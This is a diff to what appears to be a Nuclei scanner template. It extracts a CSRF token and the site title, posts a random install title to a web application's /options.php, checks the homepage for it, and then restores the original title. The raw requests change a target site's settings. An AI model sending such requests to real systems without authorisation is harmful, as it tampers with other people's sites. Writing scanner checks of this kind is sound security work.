@@ -19,7 +19,7 @@ info:
 variables:
   string: "{{randstr}}"
 
-flow: http(1) && http(2)
+flow: http(1) && http(2) && http(3) && http(4) && http(5)
 
 http:
   - raw:
@@ -43,6 +43,13 @@ http:
           - 'name="csrf_token" value="([0-9a-z]+)"'
         internal: true
 
+      - type: regex
+        name: title
+        group: 1
+        regex:
+          - '<title>Log in &raquo; ([0-9a-zA-Z]+)<\/title>'
+        internal: true
+
   - raw:
       - |
         POST /options.php HTTP/1.1
@@ -51,6 +58,15 @@ http:
 
         csrf_token={{csrf}}&section=general&this_install_title={{string}}
 
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500'
+          - 'contains(content_type, "text/html")'
+        condition: and
+        internal: true
+
+  - raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
@@ -58,7 +74,37 @@ http:
     matchers:
       - type: dsl
         dsl:
-          - 'status_code_2 == 200'
-          - 'contains(body_2, "{{string}}")'
+          - 'status_code == 200'
+          - 'contains(body, "{{string}}")'
         condition: and
-# digest: 490a00463044022042ef7eb569e76fce6d5a775547a3c6c76fd2dcc467ba7872b4abc839cd1f9982022004d05e6c7ecf01aff3bb712a8515259bdeaa19fa6f20187a1f84c0cff2cf9df1:922c64590222798bb761d5b6d8e72950
+        internal: true
+
+  - raw:
+      - |
+        POST /options.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        csrf_token={{csrf}}&section=general&this_install_title={{title}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 500'
+          - 'contains(content_type, "text/html")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "{{title}}")'
+        condition: and
+
+# digest: 4b0a00483046022100daa2dba9e143fabb75766c67df507d5f0c405097db09624ce331213630ab1354022100ba972f4e1e7dca2d28077ef7f00c1198fd67ef41126ef47d00b5d8db77a78b4a:922c64590222798bb761d5b6d8e72950
